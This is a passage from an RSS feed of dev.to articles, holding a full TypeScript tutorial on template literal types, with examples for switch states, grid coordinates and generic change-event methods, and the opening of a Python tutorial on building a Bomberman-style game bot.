      <category>watercooler</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Template Literal Types in TypeScript</title>
      <author>Maina Wycliffe</author>
      <pubDate>Thu, 24 Jun 2021 06:39:45 +0000</pubDate>
      <link>https://dev.to/this-is-learning/template-literal-types-in-typescript-4fe8</link>
      <guid>https://dev.to/this-is-learning/template-literal-types-in-typescript-4fe8</guid>
      <description>&lt;p&gt;In this article, we will take a closer look at template literal types and how you can take advantage of them in your day-to-day activities as a developer. &lt;/p&gt;

&lt;p&gt;So, what are template literal types?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#literal-types"&gt;
  &lt;/a&gt;
  Literal Types
&lt;/h2&gt;

&lt;p&gt;In order to understand what template literal types are, we first need to have a brief look at literal types. Literal types allow us to define types that are more specific, instead of something that is generalized like string or number. &lt;/p&gt;

&lt;p&gt;Let's say you have a switch; it can have the value of either on or off. One way of defining the types of this, is to use literal types, giving it the type of either &lt;code&gt;On&lt;/code&gt; or &lt;code&gt;Off&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Switch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;On&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Off&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the case above, the value of any variable of type Switch can only be &lt;code&gt;On&lt;/code&gt; or &lt;code&gt;Off&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Switch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;On&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Switch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Off&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you tried to assign any other values other than &lt;code&gt;On&lt;/code&gt; or &lt;code&gt;Off&lt;/code&gt;, typescript will throw an error:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--W179fkX9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/Template-Literal-Types-1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--W179fkX9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/Template-Literal-Types-1.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#template-literal-types"&gt;
  &lt;/a&gt;
  Template Literal Types
&lt;/h2&gt;

&lt;p&gt;Template Literal Types build on this, allowing you to build new types using a template and can expand to many different string using &lt;a href="https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#union-types"&gt;Unions&lt;/a&gt;. This works just like &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals"&gt;template literal/strings&lt;/a&gt;, but instead of concatenating to form strings, it concatenates to form types.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;string&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;tVariable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;string&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// this results to a variable&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`This is a concatenated &lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;variable&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;

&lt;span class="c1"&gt;// while this results to type&lt;/span&gt;
&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`This is a concatenated &lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;tVariable&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As you can see, they are similar in syntax apart from what they are defined as, the first being a variable and the second being a type. The type of the first definition will be string, while the second one will be of type &lt;code&gt;This is a concatenated string&lt;/code&gt; and a variable of that type can only be assigned to that string.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sN1lr1cn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/image-2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sN1lr1cn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/image-2.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NB:&lt;/strong&gt; If you tried to use variable instead of a type when defining Template Literal Type, it will throw the following error: &lt;code&gt;'variable' refers to a value, but is being used as a type here. Did you mean 'typeof variable'?&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If we take our example above of type Switch, we may want to have a function that returns the status of the switch, i.e. &lt;code&gt;Switch is On&lt;/code&gt; or &lt;code&gt;Switch is Off&lt;/code&gt;, and have it strongly typed, in that it can only return only those strings. With Template Literal Types, we can define this as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Switch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;On&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Off&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Switch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;On&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Switch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Off&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;SwitchStatus&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`Switch is &lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;Switch&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And this in return gives us the types: &lt;code&gt;Switch is On&lt;/code&gt; and &lt;code&gt;Switch is Off&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fhpav-uD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/Template-Literal-Types-3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fhpav-uD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/Template-Literal-Types-3.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#using-to-build-types-for-grid-items-coordinates"&gt;
  &lt;/a&gt;
  Using To Build Types for Grid Items Coordinates
&lt;/h2&gt;

&lt;p&gt;Let's say we are working with a grid system, and wanted to perform a task on various boxes in our grid, like placing something on a specific box given its coordinates. It would be nice if we could strongly type it and ensure we don't specify values outside the grid.&lt;/p&gt;

&lt;p&gt;For instance, if we had a grid whose length was 3 smaller boxes on either side of the box. This makes it that we have 9 smaller box fitting on our big box. We can use literal types to create a type for each of our boxes, with the type being its position in the grid. So, the first gets &lt;code&gt;L1-H1&lt;/code&gt; and the last gets &lt;code&gt;L3-H3&lt;/code&gt; types, as shown below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;SquareBoxes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L1-H1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L1-H2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L1-H3&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L2-H1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L2-H2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L2-H3&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L3-H1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L3-H2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;L3-H3&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Those are a lot of types to create by hand even for a small grid of 9 boxes. But, with template literals types, we could define just the type of the length of one side and use template string literals to expand the rest of the types:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;3&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;SmallerBoxes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`L&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;-H&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And this would yield the same result as before:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qMPMRCvr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/Template-Literal-Types-2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qMPMRCvr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cms.mainawycliffe.dev/content/images/2021/06/Template-Literal-Types-2.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This makes our work easier and it is more versatile, because if the smaller boxes ever increased or decreased, you only need to adjust the size of the length.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// 16 boxes&lt;/span&gt;
&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;3&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;4&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// 25 boxes&lt;/span&gt;
&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;3&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;4&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;5&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// 4 boxes&lt;/span&gt;
&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;2&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#combining-with-generics"&gt;
  &lt;/a&gt;
  Combining With Generics
&lt;/h2&gt;

&lt;p&gt;We can combine template literal types with generics to some amazing effect. Let's take with a Type of &lt;code&gt;Person&lt;/code&gt;, which has two properties - &lt;code&gt;name&lt;/code&gt; and &lt;code&gt;age&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;age&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We want to add two methods to be called to update the values of &lt;code&gt;name&lt;/code&gt; or &lt;code&gt;age&lt;/code&gt; i.e. &lt;code&gt;nameChanged&lt;/code&gt; or &lt;code&gt;ageChanged&lt;/code&gt;. We can create a new type, that will take type &lt;code&gt;Person&lt;/code&gt; as a generic, and for each property of type &lt;code&gt;Person&lt;/code&gt;, we will add new properties with &lt;code&gt;Changed&lt;/code&gt; appended the original properties of type Person i.e. &lt;code&gt;nameChanged&lt;/code&gt; and &lt;code&gt;ageChanged&lt;/code&gt;. We will used template literal types to create a new property by appending &lt;code&gt;Changed&lt;/code&gt; to the property name.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;WithPersonChangedEvents&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;Property&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;Type&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="kr"&gt;string&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;Property&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;Changed`&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="na"&gt;newValue&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;Property&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NB:&lt;/strong&gt; The above example uses some advanced typescript technique for manipulating types on top of Template Literal Types which you can learn more &lt;a href="https://www.typescriptlang.org/docs/handbook/2/types-from-types.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now, we can use both of our Types (&lt;strong&gt;Person&lt;/strong&gt; and &lt;strong&gt;WithPersonChangedEvent&lt;/strong&gt;) above:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;WithPersonChangedEvents&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Person&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="na"&gt;age&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="na"&gt;nameChanged&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newName&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="na"&gt;ageChanged&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newAge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newAge&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ageChanged&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Logs: 21&lt;/span&gt;
&lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nameChanged&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;new Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Logs: "new Name"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And as you can see, our object - &lt;code&gt;person&lt;/code&gt; has 4 properties, with 2 being the added methods.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;We have learned about Template Literal Types in Typescript and how they build on top Literal types to provide you even more flexibility when defining types. We have also looked at different use cases like in a grid system type definition for different boxes coordinates and combining them with generics to define extra properties for an object.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#resources"&gt;
  &lt;/a&gt;
  Resources
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Creating Types from Types - &lt;a href="https://www.typescriptlang.org/docs/handbook/2/types-from-types.html"&gt;Link&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Template Literal Types Documentation - &lt;a href="https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html"&gt;Link&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Template literals (Template strings) - &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals"&gt;Link&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Types and Mocking - Typescript - &lt;a href="https://mainawycliffe.dev/blog/types-and-mocking-typescript"&gt;Link&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Transforming Types in TypeScript with Utility Types - &lt;a href="https://mainawycliffe.dev/blog/transforming-types-typescript-utility-types"&gt;Link&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://github.com/mainawycliffe/discussion/discussions/13"&gt; Discuss this Article&lt;/a&gt;&lt;/p&gt;

</description>
      <category>typescript</category>
      <category>webdev</category>
      <category>javascript</category>
      <category>programming</category>
    </item>
    <item>
      <title>How to build an AI game bot for Bomberman</title>
      <author>Joy</author>
      <pubDate>Thu, 24 Jun 2021 06:26:44 +0000</pubDate>
      <link>https://dev.to/joooyz/how-to-build-an-ai-game-bot-for-bomberman-58a3</link>
      <guid>https://dev.to/joooyz/how-to-build-an-ai-game-bot-for-bomberman-58a3</guid>
      <description>&lt;p&gt;This is an introductory tutorial for anyone interested in building their own AI to play in a game. All you need to start is some familiarity with programming in Python. This is part 1 of a series originally published on the &lt;a href="https://www.gocoder.one/blog/how-to-build-an-ai-game-bot-bomberman"&gt;Coder One blog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We'll be using a custom game environment called Dungeons and Data Structures. It's inspired by the classic NES game &lt;a href="https://en.wikipedia.org/wiki/Bomberman"&gt;Bomberman&lt;/a&gt;, but with some variations. This game was used for an &lt;a href="https://www.gocoder.one/blog/ai-game-competitions-list"&gt;AI game competition&lt;/a&gt; called the &lt;a href="https://www.gocoder.one/aisports"&gt;AI Sports Challenge&lt;/a&gt; organized by &lt;a href="https://www.gocoder.one"&gt;Coder One&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JoDaspc_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n7sjzmhb28banzvi6gnv.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JoDaspc_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n7sjzmhb28banzvi6gnv.gif" alt="Dungeons and Data Structures"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this first part of the tutorial series, we'll cover:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Installing and setting up the Dungeons and Data Structures AI game environment&lt;/li&gt;
